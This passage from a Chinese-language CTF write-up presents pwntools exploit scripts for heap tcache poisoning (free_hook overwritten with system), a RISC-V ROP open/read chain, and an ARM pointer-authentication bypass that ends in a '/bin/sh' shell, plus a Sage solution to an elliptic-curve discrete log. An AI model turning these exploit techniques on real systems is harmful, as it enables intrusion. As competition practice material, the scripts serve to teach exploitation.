        free(str(i))
    free('8')
    free('6')
    free('7')
    l_name('/bin/sh\x00')
    show('6')
    libc_base=u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3ebd30
    print(hex(libc_base))
    #pause()
    free_hook=libc_base+0x3ED8E8-16
    system_addr=libc_base+0x000000000004F550#0x4F4E0+0x70
    add('9',0x60)
    add('10',0x20)
    add('0',0x40)
    free('7')
    edit('9','a'*0x38+p64(0)+p64(0x51)+p64(free_hook))
    add('1',0x40)
    add('2',0x40)#free_hook
    edit('2','/bin/sh\x00'+p64(system_addr))
    edit('9','a'*0x38+p64(0)+p64(0x51)+'/bin/sh\x00')
    #pause()
    free('7')
    sh.interactive()
###  Favourite Architecure flag1
是个risc
v架构的程序，用ghidra分析。搜索字符串flag找到主函数后，看到输入距离s0有0x128字节，s0之前的8个字节存储了返回地址，因此溢出需要填充0x120个垃圾数据。接下来只需要寻找gadget进行orw操作来读出flag。从entry处开始手动查找到了一个可以用来重复调用函数的gadget，并且能够设置3个参数。
一开始想要返回到0x1179e处设置函数参数，再到0x1178c处利用设置好的s0来控制a5的值实现任意函数调用，但因为是c.ld，在程序中又没有找到got表，因此使用另一个gadget来设置a5，其实就是上面的0x11772。
只要控制好s2的值等于a5+0x470就能够跳转回0x1179e，再进行一次参数设置后就可以跳转到0x1178e进行任意函数调用了，调用完毕继续执行下面的设置参数部分，可以控制返回地址回到溢出点的位置实现重复利用。
因此rop链就是溢出点->0x1179e->0x11772->0x1179e->0x1178e->0x1179e->溢出点。
接下来的问题就是找到程序中的open和read函数了。查询risc
v的系统调用ecall字符串，可以找到很多系统调用，在上方总有一条设置a7的指令，因为在risc
v中将系统调用号存储在a7寄存器中。接下来搜设置a7寄存器的机器码，其中a7为0x38的是openat，0x3f的是read。
exp:
    from pwn import *
    context.log_level='debug'
    def get_payload(target_fun,para1,para2,para3):
        payload='a'*0x120+p64(0x1179e)+p64(0)+p64(para3)+p64(para2)+p64(para1)+p64(target_fun+0x470)+p64(0)+p64(target_fun+0x478)+p64(0x11772)
        payload+=p64(0)+p64(para3)+p64(para2)+p64(para1)+p64(1)+p64(0)*2+p64(0x1178e)
        payload+=p64(0)*7+p64(0x10400)
        return payload
    read_addr=0x222ce
    open_addr=0x221cc
    printf_addr=0x1605a
    file_name=0x6c120
    flag_addr=0x6c110
    sh=remote('119.28.89.167',60001)
    payload=get_payload(read_addr,0,file_name,15)
    sh.sendlineafter('flag:',payload)
    sh.send('/home/pwn/flag\x00')
    payload=get_payload(open_addr,file_name,0,0)
    sh.sendlineafter('flag:',payload)
    payload=get_payload(read_addr,3,flag_addr,0x40)
    sh.sendlineafter('flag:',payload)
    payload=get_payload(printf_addr,flag_addr,0,0)
    sh.sendlineafter('flag:',payload)
    sh.interactive()
###  babypac
step1：爆hash  
step2：pac  
看到paciasp给栈指针和返回地址进行加密，恰巧lock运用到pacia加密，于是在name中填入第一步rop的地址（csu），然后解密lock得pac，构造rop链即可  
step3：泄露libc基址0x4000838000，system(“/bin/sh”);
    from pwn import *
    import hashlib
    from subprocess import check_output
    from z3 import *
    context.log_level='debug'
    def get_payload(target_fun,para1,para2,para3):
        rop='a'*0x20+p64(0)+p64(0x400ff8)+p64(0)+p64(0x400fd8)+p64(0)+p64(1)+p64(target_fun)+p64(para1)+p64(para2)+p64(para3)
        rop+=p64(0)+p64(0x400bdc)+p64(0)*6
        return rop
    def pac_get_payload(pac,target_fun,para1,para2,para3):
        rop='a'*0x20+p64(pac-0x400ff8)+p64(pac)+p64(0)+p64(0x400fd8)+p64(0)+p64(1)+p64(target_fun)+p64(para1)+p64(para2)+p64(para3)
        rop+=p64(0)+p64(0x400f5c)+p64(0)*6
        return rop
    def get_i_bit_right(cipher, bits):
        tmp = cipher[:bits]
        for i in range(len(cipher) - bits):
            tmp.append(tmp[i] ^ cipher[i+bits])
        return tmp
    def get_i_bit_left(cipher, bits):
        tmp = cipher[-bits:]
        for i in range(len(cipher) - bits):
            tmp = [tmp[-(i+1)] ^ cipher[-(i+bits+1)]] + tmp
        return tmp
    def digit_pac(res):
        known = [int(i) for i in bin(res)[2:].rjust(64, '0')]
        t1 = get_i_bit_right(known, 13)
        t2 = get_i_bit_left(t1, 31)
        t3 = get_i_bit_right(t2, 11)
        t4 = get_i_bit_left(t3, 7)
        return int(''.join([str(i) for i in t4]), 2)
    def exp(target_fun,para1,para2,para3):
        sh.sendafter('name: ',p64(0x400ff8)+p64(0)+p64(0x10A9FC70042)+p64(0))
        sh.sendlineafter('>> ','2')
        sh.sendlineafter('idx: ','-2')
        sh.sendlineafter('>> ','3')
        sh.recvuntil('name: ')
        pac = u64(sh.recv(8))
        pac = digit_pac(pac)
        success('0x%x'%pac)
        sh.sendlineafter('>> ','2')
        sh.sendlineafter('idx: ','-1')
        sh.sendlineafter('>> ','4')
        sh.sendlineafter('idx: ','-1')
        #sh.sendlineafter('idx: ','-1')
        sleep(0.5)
        rop=pac_get_payload(pac,target_fun,para1,para2,para3)
        sh.send(rop)
        sleep(0.5)
    map=[]
    for i in range(9):
        map.append(str(i))
    for i in range(26):
        map.append(chr(ord('a')+i))
        map.append(chr(ord('A')+i))
    sh=remote('52.255.184.147',8080)
    sleep(3)
    sh.recvuntil('+')
    plain=sh.recvuntil(")")[:-1]
    sh.recvuntil('== ')
    target=sh.recv(64)
    sign=0
    for i in map:
        if(sign):
            break
        for j in map:
            if(sign):
                break
            for k in map:
                if(sign):
                    break
                for l in map:
                    temp=i+j+k+l+plain
                    s = hashlib.sha256()    
                    s.update(temp)    
                    b = s.hexdigest()
                    if(b==target):
                        print(i+j+k+l)
                        print(temp)
                        print(b)
                        sh.sendlineafter('xxxx:',i+j+k+l)
                        sign=1
    #sh=remote('127.0.0.1',23337)
    sh_addr=0x412088
    save_system=0x412078
    leak_addr=0x411fb0
    fmt_addr=0x411FE0
    printf_got=0x411FE0
    read_got=0x411FD8
    #0x4000881d38
    libc_base=0x4000838000#u64(sh.recv(8).ljust(8,'\x00'))#-0x49d38
    success('libc_base : 0x%x'%libc_base)
    system_addr=libc_base+0x40400
    open_addr=libc_base+0xc2f78
    printf_addr=libc_base+0x49d38
    exp(read_got,0,save_system,0x18)
    sh.send(p64(system_addr)+p64(open_addr)+'/bin/sh\x00')
    exp(save_system,sh_addr,0,0)
    sh.interactive()
## Crypto
###  Mycurve
搜了一下加法公式，发现是Binary Edward Curve，然后就用提出这个曲线的paper里的映射
将他映射到一般椭圆曲线上，然后通过以下公式算出参数
由于是在$GF(2^{100})$上，足够光滑，sage直接可以求出DLP，exp如下
    from Crypto_tools import *
    def add(P,Q):
        if Q==0:
            return P
        x1,y1=P
        x2,y2=Q
        return (d1*(x1+x2)+d2*(x1+y1)*(x2+y2)+(x1+x1^2)*(x2*(y1+y2+1)+y1*y2))/(d1+(x1+x1^2)*(x2+y2)),(d1*(y1+y2)+d2*(x1+y1)*(x2+y2)+(y1+y1^2)*(y2*(x1+x2+1)+x1*x2))/(d1+(y1+y1^2)*(x2+y2))
    def mul(k,P):
        Q=(0,0)
        while k>0:
            if is_even(k):
                k/=2
                P=add(P,P)
            else:
                k-=1
                Q=add(P,Q)
        return Q
    _F=GF(2**100)
    _R.=_F[]
    d1=_F.fetch_int(1)
    d2=_F.fetch_int(1)
    _G = (_F.fetch_int(698546134536218110797266045394),_F.fetch_int(1234575357354908313123830206394))
    _P = (_F.fetch_int(403494114976379491717836688842), _F.fetch_int(915160228101530700618267188624))
    def g(point):
        y, x = point
        return x**2 + x*y - y**3 - 2*y**2 - 3
    def To_Birational(point):
        x, y = point
        return (3*(x+y)) / (x*y + x + y),  3*(x / (x*y+x+y) + 2)
    E = EllipticCurve(GF(2**100), [1, 2, 0, 0, 3])
    G = To_Birational(_G)
    P = To_Birational(_P)
    assert g(G) == g(P) == 0
    G = E(G)
    P = E(P)
    flag = G.discrete_log(P)
    print(long_to_bytes(flag))